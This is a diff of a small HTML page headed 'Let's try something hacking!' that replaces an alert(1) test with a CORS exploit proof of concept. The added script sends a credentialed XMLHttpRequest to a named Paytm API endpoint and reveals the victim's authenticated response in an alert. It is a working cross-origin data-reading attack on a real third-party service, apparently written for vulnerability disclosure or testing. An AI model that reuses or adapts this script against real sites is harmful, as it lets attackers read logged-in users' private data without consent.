@@ -2,11 +2,23 @@
 <body style="text-align:center;">
 <h1>Helllo, it's VIREN!</h1>
   <p>Let's try something hacking!</p>
-  <button type="button" onclick="demo()">Exploit</button>
-  <script>
-    function demo(){
-      alert(1);
+  <div id="demo">
+<button type="button" onclick="cors()">Exploit</button>
+</div>
+ 
+<script>
+function cors() {
+  var xhttp = new XMLHttpRequest();
+  xhttp.onreadystatechange = function() {
+    if (this.readyState == 4 && this.status == 200) {
+      document.getElementById("demo").innerHTML = alert(this.responseText);
     }
-  </script>
+  };
+  xhttp.open("OPTIONS", "https://serviceability.paytm.com/v2/checkavailability/?channel=web&child_site_id=6&site_id=2&version=2&code=382424", true);
+  xhttp.withCredentials = true;
+  xhttp.send();
+}
+</script>
+ 
 </body>
 </html>
